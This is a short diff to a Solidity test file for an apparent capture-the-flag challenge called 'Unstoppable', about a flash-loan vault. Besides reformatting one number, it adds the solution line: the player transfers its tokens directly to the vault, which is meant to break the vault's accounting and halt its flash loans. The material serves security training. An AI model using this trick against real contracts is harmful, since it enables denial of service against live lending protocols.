@@ -36,7 +36,7 @@ contract ChallengeUnstoppable is Test {
     assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
     assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
     assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0);
-    assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50000 ether);
+    assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50_000 ether);
 
     token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);
     assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);
@@ -52,6 +52,7 @@ contract ChallengeUnstoppable is Test {
      * CODE YOUR SOLUTION HERE
      */
     changePrank(player);
+    token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
     /**
      * SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE
      */
